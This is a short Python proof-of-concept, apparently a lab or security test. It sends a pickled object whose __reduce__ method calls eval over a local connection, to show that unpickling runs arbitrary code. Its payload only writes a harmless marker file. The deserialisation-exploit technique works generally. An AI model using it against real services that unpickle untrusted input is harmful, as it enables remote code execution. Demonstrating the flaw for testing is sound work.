"""Inert local marker demonstrates unsafe object decoding; not a defense pass."""
import tempfile
from pathlib import Path
from brake_roles import Lab

class Marker:
    def __init__(self, path): self.path = path
    def __reduce__(self):
        return eval, ("(__import__('pathlib').Path(%r).write_text('decoded'), ('snapshot', ()))[1]" % self.path,)

if __name__ == '__main__':
    with tempfile.TemporaryDirectory() as directory:
        target = Path(directory) / 'marker'
        lab = Lab()
        try:
            lab.requester.connection.send(Marker(str(target)))
            if lab.requester.connection.poll(2): lab.requester.connection.recv_bytes()
            print('PICKLE_MARKER_EXECUTED=' + str(target.exists()))
        finally: lab.close()
